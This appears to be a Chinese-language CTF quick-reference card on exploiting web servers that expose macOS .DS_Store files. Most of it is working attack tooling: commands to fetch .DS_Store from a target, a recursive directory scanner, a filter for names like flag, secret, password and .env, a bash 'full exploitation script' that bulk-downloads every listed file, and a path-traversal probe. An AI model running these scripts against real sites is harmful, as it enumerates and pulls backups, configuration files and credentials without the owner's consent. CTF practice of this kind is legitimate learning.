# .DS_Store 快速参考卡

## 🚀 快速开始

### 1. 基础解析（无需安装库）

```bash
# 使用我们的工具
cd /Users/ss/Documents/note/ctf/misc
python3 ds_store_parser.py /path/to/.DS_Store

# 或从 URL 下载并解析
python3 ds_store_parser.py http://example.com/.DS_Store
```

### 2. 使用 Python 库（推荐）

```bash
# 安装
pip install ds_store

# 解析本地文件
python3 << 'EOF'
from ds_store import DSStore

with DSStore.open('.DS_Store', 'r+') as ds:
    for entry in ds:
        if entry.filename != '.':
            print(entry.filename)
EOF
```

### 3. 使用 ds_store_exp（专业工具）

```bash
# 克隆工具
git clone https://github.com/lijiejie/ds_store_exp.git
cd ds_store_exp

# 本地文件
python ds_store_exp.py /path/to/.DS_Store

# 远程 URL
python ds_store_exp.py http://example.com/.DS_Store
```

## 📝 常见命令

### 下载远程 .DS_Store

```bash
# wget
wget http://example.com/.DS_Store

# curl
curl http://example.com/.DS_Store -o .DS_Store

# 批量下载多个路径
for path in "" "admin" "uploads" "backup"; do
    wget http://example.com/${path}/.DS_Store -O ${path}_DS_Store 2>/dev/null
done
```

### 字符串提取（不依赖库）

```bash
# 提取所有可打印字符串
strings .DS_Store

# 过滤文件名模式
strings .DS_Store | grep -E '\.(txt|php|zip|sql|bak)$'

# 查找 flag 相关
strings .DS_Store | grep -i flag
```

### 十六进制查看

```bash
# 使用 xxd
xxd .DS_Store | less

# 使用 hexdump
hexdump -C .DS_Store | less

# 查看文件头（前32字节）
xxd -l 32 .DS_Store
# 应该看到: 00000001 Bud1 ...
```

## 🔍 CTF 利用技巧

### 技巧1: 递归发现目录

```python
import requests
from ds_store import DSStore
import os

def scan_recursive(base_url, path='', depth=0):
    if depth > 3:
        return

    url = f"{base_url}{path}/.DS_Store"

    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            with open('temp.ds', 'wb') as f:
                f.write(r.content)

            with DSStore.open('temp.ds', 'r+') as ds:
                for e in ds:
                    if e.filename and e.filename != '.':
                        full_path = f"{path}/{e.filename}"
                        print(f"[+] {full_path}")

                        # 递归扫描
                        scan_recursive(base_url, full_path, depth+1)

            os.remove('temp.ds')
    except:
        pass

# 使用
scan_recursive('http://target.com')
```

### 技巧2: 批量下载发现的文件

```bash
# 1. 解析 .DS_Store 获取文件列表
python3 ds_store_parser.py .DS_Store

# 2. 创建下载列表
cat .DS_Store.txt | grep -v "^#" | while read file; do
    echo "http://target.com/$file"
done > urls.txt

# 3. 批量下载
wget -i urls.txt
```

### 技巧3: 查找敏感文件

```python
from ds_store import DSStore

sensitive_keywords = ['flag', 'key', 'secret', 'admin',
                      'config', 'backup', 'password', 'db']

with DSStore.open('.DS_Store', 'r+') as ds:
    for entry in ds:
        filename = entry.filename.lower()
        for keyword in sensitive_keywords:
            if keyword in filename:
                print(f"🚩 {entry.filename}")
                break
```

## 🛠️ 实用脚本

### 完整利用脚本

```bash
#!/bin/bash
# .DS_Store 完整利用脚本

TARGET="$1"
if [ -z "$TARGET" ]; then
    echo "用法: $0 <URL>"
    exit 1
fi

echo "[*] 目标: $TARGET"

# 1. 下载 .DS_Store
echo "[1] 下载 .DS_Store..."
wget "${TARGET}/.DS_Store" -q -O .DS_Store

if [ ! -f .DS_Store ]; then
    echo "[-] 下载失败"
    exit 1
fi

# 2. 解析文件列表
echo "[2] 解析文件列表..."
python3 ds_store_parser.py .DS_Store

# 3. 创建下载列表
echo "[3] 创建下载列表..."
cat .DS_Store.txt | grep -v "^#" | while read file; do
    echo "${TARGET}/${file}"
done > download_urls.txt

# 4. 批量下载
echo "[4] 开始下载文件..."
mkdir -p downloads
cd downloads
wget -i ../download_urls.txt -q --show-progress

echo "[*] 完成! 文件保存在 downloads/ 目录"
```

## 📊 常见文件模式

```
flag.txt          ← 直接的 flag 文件
flag_*.txt        ← 变体 flag 文件
backup.zip        ← 备份文件
config.php        ← 配置文件
.env              ← 环境变量
database.sql      ← 数据库备份
admin.php         ← 管理页面
secret/           ← 敏感目录
.git/             ← Git 仓库泄露
```

## ⚡ 一键命令

```bash
# 快速解析并显示可疑文件
python3 -c "
from ds_store import DSStore
import re
with DSStore.open('.DS_Store', 'r+') as ds:
    for e in ds:
        if e.filename and re.search(r'flag|secret|key|admin', e.filename, re.I):
            print('🚩', e.filename)
        elif e.filename and e.filename != '.':
            print('📄', e.filename)
"

# 提取所有文件名
python3 -c "
from ds_store import DSStore
with DSStore.open('.DS_Store', 'r+') as ds:
    [print(e.filename) for e in ds if e.filename and e.filename != '.']
"
```

## 🔧 故障排查

### 问题: ImportError: No module named 'ds_store'

```bash
# 解决方案
pip3 install ds_store

# 或使用 conda
conda install -c conda-forge python-ds-store
```

### 问题: 解析失败或乱码

```bash
# 使用字符串提取作为备份方案
strings .DS_Store > filenames.txt

# 手动过滤
cat filenames.txt | grep -E '^[a-zA-Z0-9_.-]+$'
```

### 问题: 文件无法下载

```bash
# 检查文件是否存在
curl -I http://target.com/filename.txt

# 尝试不同路径
curl http://target.com/./filename.txt
curl http://target.com/../filename.txt
```

## 📚 扩展阅读

- 完整指南: `DS_Store解析指南.md`
- 工具脚本: `ds_store_parser.py`
- GitHub 工具: https://github.com/lijiejie/ds_store_exp

---

**快速参考 v1.0** | 更新: 2025-01
